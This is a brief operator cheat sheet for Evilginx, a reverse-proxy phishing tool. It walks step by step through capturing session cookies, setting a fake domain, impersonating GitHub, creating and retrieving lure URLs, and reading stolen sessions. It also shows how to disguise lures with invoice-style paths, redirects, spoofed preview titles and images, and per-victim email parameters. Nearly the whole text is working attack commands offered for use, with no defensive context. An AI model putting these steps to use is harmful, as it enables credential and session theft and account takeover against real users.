# Evilginx
https://altcodeunicode.com/alt-codes-for-french-letters-with-accents-or-diacritics/
<div>
0.To capure session Cookies : 
		` set cookies always --> keys: ['user_session:always']`

1.Setup domain
		`config domain fake.com/custom domain`

2.config IPv4
		`config ipv4 127.0.0.1`

3.set phishlet hostname
		`phishlets hostname github github.io.fake.com`
4.Enable Phishlet
		`phishlets enable github `

5.Optinal(Dev mode\Local Mode)
		`phishlets get-hosts github`

		127.0.0.1 github.io.fake.com
		127.0.0.1 api.github.io.fake.com
		127.0.0.1 github.github.io.fake.com
		SET THIS TO /ETC/HOSTS 

6.Create Lures
		`lures create github`

7.List all lures
		`lures`

8.Get the Lures URLs
		`lures get-urls 0 (id .i.e 0)`

** `For CA Certi search this  %USERPROFILE%  and install ca.certi`

9.Get Cookies/Sessions
		` sessions Id`


*********************************************************************************\
## Personalizing Lures
1.Edit Lures
	`lures edit 0(id) path /download/invoice/12342345`

2.Edit hostname
 	`lures edit 0 hostname thisismyrealwebsite.fake.com`

## Redirect URl
1.Redirect url
	`lures edit 0 redirect_url https://abcd.com/`

 
 
 2.Set Title name  and Images 
	- We can change `og_title ,og_desc,og_image,og_url`
   		`lures edit 0 og_title abccwrfgg_title`

3.Custom Parameter
	`lures get-url 0 email=abc@robin.com name=robin`
